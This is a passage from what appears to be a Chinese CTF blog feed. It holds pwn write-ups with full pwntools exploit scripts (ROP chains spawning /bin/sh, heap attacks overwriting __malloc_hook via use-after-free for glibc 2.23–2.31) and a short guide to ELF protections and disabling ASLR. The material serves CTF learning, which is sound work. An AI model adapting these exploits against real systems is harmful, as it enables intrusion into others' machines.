class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> message_pb2<br><br>p  = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/usr/lib/libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>message = message_pb2.protoMessage()<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Gift: &#x27;</span>)<br>puts = <span class="hljs-built_in">int</span>(p.recv(),<span class="hljs-number">16</span>)<br>libc_base = puts - <span class="hljs-number">0x07f7d0</span><br>log.success(<span class="hljs-string">&#x27;libc_base ==&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>pop_rdi = libc_base + <span class="hljs-number">0xfd8c4</span> <span class="hljs-comment"># 0x00000000000fd8c4 : pop rdi ; ret</span><br>binsh = libc_base + <span class="hljs-number">0x1aae28</span> <span class="hljs-comment"># 0x00000000001aae28 : /bin/sh</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret = libc_base + <span class="hljs-number">0xfd8c5</span><br><br>message.size = <span class="hljs-number">0x500</span><br>message.buffer = cyclic(<span class="hljs-number">536</span>) + p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)<br>data = message.SerializeToString()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.send(data)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>edit函数可以无限溢出，主要是利用edit函数中调用的memcpy函数<br>不想看go逆出来的一堆代码，直接用系统调用</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf = ELF(<span class="hljs-string">&quot;./note&quot;</span>)<br>p = process(<span class="hljs-string">&quot;./note&quot;</span>)<br><br>pop_rax_rbp = <span class="hljs-number">0x404408</span> <span class="hljs-comment">#0x0000000000404408 : pop rax ; pop rbp ; ret</span><br>pop_rbx = <span class="hljs-number">0x404541</span> <span class="hljs-comment">#0x0000000000404541 : pop rbx ; ret</span><br>mov_rcx_0 = <span class="hljs-number">0x40318e</span> <span class="hljs-comment">#0x000000000040318e : mov rcx, 0 ; ret</span><br>pop_rdx = <span class="hljs-number">0x47a8fa</span> <span class="hljs-comment">#0x000000000047a8fa : pop rdx ; ret</span><br>xor_rdi = <span class="hljs-number">0x411aee</span> <span class="hljs-comment">#0x0000000000411aee : xor edi, edi ; add rsp, 0x10 ; pop rbp ; ret</span><br>mov_mrax_edx = <span class="hljs-number">0x402fd1</span> <span class="hljs-comment">#0x0000000000402fd1 : mov dword ptr [rax], edx ; ret</span><br>ret = <span class="hljs-number">0x47f6ea</span> <br>go_syscall = <span class="hljs-number">0x403160</span><br><br>addr = <span class="hljs-number">0x520000</span> <br><br>payload  = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">64</span><br>payload += p64(pop_rax_rbp) + p64(addr) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + <span class="hljs-string">b&#x27;/bin&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span> + p64(mov_mrax_edx) <br>payload += p64(pop_rax_rbp) + p64(addr+<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + <span class="hljs-string">b&#x27;/sh\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span> + p64(mov_mrax_edx)<br><span class="hljs-comment">#payload += p64(ret)</span><br>payload += p64(pop_rax_rbp) + p64(<span class="hljs-number">0x3b</span>) + p64(<span class="hljs-number">0</span>)+ p64(pop_rbx) + p64(addr) + p64(mov_rcx_0) + p64(xor_rdi) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(go_syscall)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;choice &gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content: &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;choice &gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;id: &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content: &#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="starlink"><a href="#starlink" class="headerlink" title="starlink"></a>starlink</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>glibc-2.35，对应ubuntu-22.04</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件保护机制</title>
      <link href="/2024/06/07/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/06/07/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>简单介绍ELF文件保护机制，并且给了gcc编译选项</p><span id="more"></span><p>本文提到的编译选项，可以访问官方文档以获取更详细，更准确的介绍<br><a href="https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Option-Summary.html">https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Option-Summary.html</a></p><h1 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc a.c -o a<span class="hljs-comment"># 默认部分开启canary，即仅在含有char数组的函数中加入canary</span><br>gcc a.c -o a -fno-stack-protector <span class="hljs-comment"># 关闭canary</span><br>gcc a.c -o a -fstack-protector <span class="hljs-comment"># 部分开启canary，这是默认选项</span><br>gcc a.c -o a -fstack-protector-all <span class="hljs-comment"># 在所有函数中插入canary，即使没有char数组</span><br></code></pre></td></tr></table></figure><h1 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc a.c -o a <span class="hljs-comment"># 默认栈不可执行</span><br>gcc a.c -o a -z execstack <span class="hljs-comment"># 栈可执行</span><br>gcc a.c -o a -z noexecstack <span class="hljs-comment"># 栈不可执行，这是默认选项</span><br></code></pre></td></tr></table></figure><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE，全名 position-independent code for executables</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 以下选项编译程序时使用</span><br>-fpic <span class="hljs-comment"># 如果可能，生成1级的位置无关的代码，适用于共享库</span><br>-fPIC <span class="hljs-comment"># 如果可能，生成2级的位置无关的代码，适用于共享库</span><br>-fpie<span class="hljs-comment"># 如果可能，生成1级的位置无关的代码，适用于可执行程序</span><br>-fPIE <span class="hljs-comment"># 如果可能，生成2级的位置无关的代码，适用于可执行程序</span><br>-fno-pie <span class="hljs-comment"># 生成位置相关的代码</span><br><br><span class="hljs-comment"># 以下选项链接程序时使用</span><br>-pie <span class="hljs-comment"># 创建位置无关的可执行程序</span><br>-no-pie <span class="hljs-comment"># 不创建位置无关的可执行程序</span><br><br><span class="hljs-comment"># 注意</span><br><span class="hljs-comment"># 关于‘如果可能’，请查看官方文档，一般来说指目标机器支持</span><br><span class="hljs-comment"># -fpie与-fPIE的区别请查看官方文档</span><br><span class="hljs-comment"># -fpie需要与-pie一起使用，一个用于编译阶段，一个用于链接阶段</span><br><span class="hljs-comment"># -fno-pie与-pie一起使用会报错</span><br><br><span class="hljs-comment"># 用法</span><br>gcc a.c -o a <span class="hljs-comment"># 默认开启 -fpie 与 -pie</span><br>gcc a.c -o a -fpie -pie <span class="hljs-comment"># 生成位置无关的程序</span><br>gcc a.c -o a -fno-pie -no-pie <span class="hljs-comment"># 生成位置相关的程序</span><br></code></pre></td></tr></table></figure><h1 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h1><p>有以下两种方式查看ASLR状态</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> /proc/sys/kernel/randomize_va_space<br>2<br><br>sysctl -a --pattern randomize<br>kernel.randomize_va_space = 2<br></code></pre></td></tr></table></figure><p>通过以下两种方式修改ASLR状态</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 全局更改</span><br><span class="hljs-built_in">sudo</span> -s <span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space<br><br><span class="hljs-comment"># 全局更改</span><br>sysctl -w kernel.randomize_va_space=0<br><br><span class="hljs-comment"># 使用setarch控制某个程序关闭ASLR</span><br>setarch `<span class="hljs-built_in">uname</span> -m` -R ./your_program<br><br><span class="hljs-comment"># 使用gdb修改</span><br><span class="hljs-built_in">set</span> disable-randomization on <span class="hljs-comment"># 开启</span><br><span class="hljs-built_in">set</span> disable-randomization off <span class="hljs-comment"># 关闭</span><br>show disable-randomization <span class="hljs-comment"># 查看</span><br></code></pre></td></tr></table></figure><p>关于ASLR状态</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 0 = 关闭</span><br><span class="hljs-comment"># 1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</span><br><span class="hljs-comment"># 2 = 全随机。除了1中所述，还有heap。</span><br></code></pre></td></tr></table></figure><p>注意：只有在开启 ASLR 之后，PIE 才会生效。  </p><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">Partial RELRO：.got不可写，.got.plt 可写<br>Full RELRO：.got和.got.plt 均不可写<br>gcc a.c -o a <span class="hljs-comment"># 默认 -z lazy</span><br>gcc a.c -o a -z norelro <span class="hljs-comment"># 关闭，No RELRO</span><br>gcc a.c -o a -z lazy <span class="hljs-comment"># 部分开启，Partial RELRO</span><br>gcc a.c -o a -z now <span class="hljs-comment"># 完全开启，Full RELRO</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024 wp</title>
      <link href="/2024/06/03/LitCTF2024-wp/"/>
      <url>/2024/06/03/LitCTF2024-wp/</url>
      
        <content type="html"><![CDATA[<p>LitCTF 2024 wp，5道堆题1道栈题，堆杀疯了</p><span id="more"></span><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="heap-2-23"><a href="#heap-2-23" class="headerlink" title="heap-2.23"></a>heap-2.23</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>glibc2.23，没有tcache，delete函数中有个UAF漏洞</p><ol><li>利用unsorted bin 泄露libc基址</li><li>修改释放到fastbin的堆块的fd指针，利用错位出0x7f绕过fastbin的分配检测，使堆分配到<code>__malloc_hook</code>附近，覆盖 <code>__malloc_hook</code>为one_gadget</li><li>执行malloc获取shell</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal =[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node3.anna.nssctf.cn&quot;,28132)</span><br><br>elf = ELF(<span class="hljs-string">&quot;./heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index,size</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;size? &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;content : &#x27;</span>,content)<br><br><br><span class="hljs-comment"># leak libc_base</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x200</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">3951480</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br><br>create(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br><br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="heap-2-27"><a href="#heap-2-27" class="headerlink" title="heap-2.27"></a>heap-2.27</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>glibc2.27，有tcache了，还是一样的程序<br>思路和2.23差不多,不过要注意tcache的next指针指向的不是chunk头的位置，而是用户内存的位置，此外甚至没有任何保护，比2.23还简单</p><ol><li>利用unsorted bin 泄露libc基址</li><li>修改释放到tcache的堆块的next指针，使堆分配到<code>__malloc_hook</code>附近，覆盖 <code>__malloc_hook</code>为one_gadget</li><li>执行malloc获取shell</li></ol><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal =[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28695)</span><br><br>elf = ELF(<span class="hljs-string">&quot;./heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index,size</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;size? &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;content : &#x27;</span>,content)<br><br><span class="hljs-comment"># gadget</span><br>one_gadget_l = [<span class="hljs-number">0x4f29e</span>,<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br><br><span class="hljs-comment"># leak libc_base</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">4111520</span> <br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_gadget = libc_base + one_gadget_l[<span class="hljs-number">3</span>]<br><br>create(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>,p64(malloc_hook))<br><br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br><br>edit(<span class="hljs-number">4</span>,p64(one_gadget))<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="heap-2-31"><a href="#heap-2-31" class="headerlink" title="heap-2.31"></a>heap-2.31</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>glibc2.31，tcache加了个count检测，只要多释放一个堆块就好</p><ol><li>利用unsorted bin 泄露libc基址</li><li>修改释放到tcache的堆块的next指针，使堆分配到<code>__malloc_hook</code>附近，覆盖 <code>__malloc_hook</code>为one_gadget</li><li>执行malloc获取shell</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal =[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node2.anna.nssctf.cn&quot;,28596)</span><br><br>elf = ELF(<span class="hljs-string">&quot;./heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index,size</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;size? &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span 